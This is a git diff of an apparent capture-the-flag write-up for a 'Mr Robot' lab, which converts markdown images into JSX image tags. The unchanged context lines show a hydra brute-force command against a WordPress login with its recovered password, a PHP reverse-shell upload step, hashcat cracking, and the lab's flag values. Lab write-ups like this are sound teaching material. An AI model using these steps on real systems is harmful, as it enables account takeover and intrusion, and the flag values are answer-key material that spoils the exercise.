@@ -68,9 +68,13 @@ kali@kali:~$ curl http://10.10.157.219/fsocity.dic > password.txt
 
 ### #1 What is key 1?
 
-![https://imgur.com/kSyfQPC.png](https://imgur.com/kSyfQPC.png)
+<div className="Image__Medium">
+  <img src="https://imgur.com/kSyfQPC.png" alt="blog_image" />
+</div>
 
-![https://imgur.com/ip9jZ1e.png](https://imgur.com/ip9jZ1e.png)
+<div className="Image__Medium">
+  <img src="https://imgur.com/ip9jZ1e.png" alt="blog_image" />
+</div>
 
 ```bash
 073403c8a58a1f80d943455fb30724b9
@@ -78,7 +82,9 @@ kali@kali:~$ curl http://10.10.157.219/fsocity.dic > password.txt
 
 ### #2 What is key 2?
 
-![https://imgur.com/bGkyJa4.png](https://imgur.com/bGkyJa4.png)
+<div className="Image__Medium">
+  <img src="https://imgur.com/bGkyJa4.png" alt="blog_image" />
+</div>
 
 ```bash
 kali@kali:~$ hydra -l Elliot -P password.txt 10.10.157.219 http-post-form "/wp-login:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=10.10.157.219/wp-admin/&testcookie=1:S=302"
@@ -88,7 +94,9 @@ kali@kali:~$ hydra -l Elliot -P password.txt 10.10.157.219 http-post-form "/wp-l
 [80][http-post-form] host: 10.10.157.219   login: "Elliot"  password: "ER28-0652"
 ```
 
-![https://imgur.com/h69iWzK.png](https://imgur.com/h69iWzK.png)
+<div className="Image__Medium">
+  <img src="https://imgur.com/h69iWzK.png" alt="blog_image" />
+</div>
 
 ### Now let's implement some php reverse shell.
 
@@ -250,7 +258,9 @@ function printit ($string) {
 ?>
 ```
 
-![https://imgur.com/iHDOA5E.png](https://imgur.com/iHDOA5E.png)
+<div className="Image__Medium">
+  <img src="https://imgur.com/iHDOA5E.png" alt="blog_image" />
+</div>
 
 ### But before we need to zip the shell.php to upload it.
 
@@ -259,13 +269,19 @@ kali@kali:~/Desktop$ zip shell.zip shell.php
 adding: shell.php (deflated 59%)
 ```
 
-![https://imgur.com/8R8hdRA.png](https://imgur.com/8R8hdRA.png)
+<div className="Image__Medium">
+  <img src="https://imgur.com/8R8hdRA.png" alt="blog_image" />
+</div>
 
 Great we successfully upload our php shell ! Let's active it
 
-![https://imgur.com/TJWP8eN.png](https://imgur.com/TJWP8eN.png)
+<div className="Image__Medium">
+  <img src="https://imgur.com/TJWP8eN.png" alt="blog_image" />
+</div>
 
-![https://imgur.com/fQmZmpc.png](https://imgur.com/fQmZmpc.png)
+<div className="Image__Medium">
+  <img src="https://imgur.com/fQmZmpc.png" alt="blog_image" />
+</div>
 
 Nice ! :D we have a shell let's make it fancy now
 
@@ -273,13 +289,19 @@ Nice ! :D we have a shell let's make it fancy now
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-![https://imgur.com/kMjgqa7.png](https://imgur.com/kMjgqa7.png)
+<div className="Image__Medium">
+  <img src="https://imgur.com/kMjgqa7.png" alt="blog_image" />
+</div>
 
-![https://imgur.com/MN5tFup.png](https://imgur.com/MN5tFup.png)
+<div className="Image__Medium">
+  <img src="https://imgur.com/MN5tFup.png" alt="blog_image" />
+</div>
 
 As you can see we can't see the key2 but we have an hash so let's crack it
 
-![https://imgur.com/8GOkKch.png](https://imgur.com/8GOkKch.png)
+<div className="Image__Medium">
+  <img src="https://imgur.com/8GOkKch.png" alt="blog_image" />
+</div>
 
 ```bash
 kali@kali:~/Desktop$ hashcat -m 0 --force hashmrrobot /usr/share/wordlists/rockyou.txt
@@ -291,7 +313,9 @@ c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
 
 ### #3 What is key 3?
 
-![https://imgur.com/37RDyTP.png](https://imgur.com/37RDyTP.png)
+<div className="Image__Medium">
+  <img src="https://imgur.com/37RDyTP.png" alt="blog_image" />
+</div>
 
 ```bash
 su -l robot
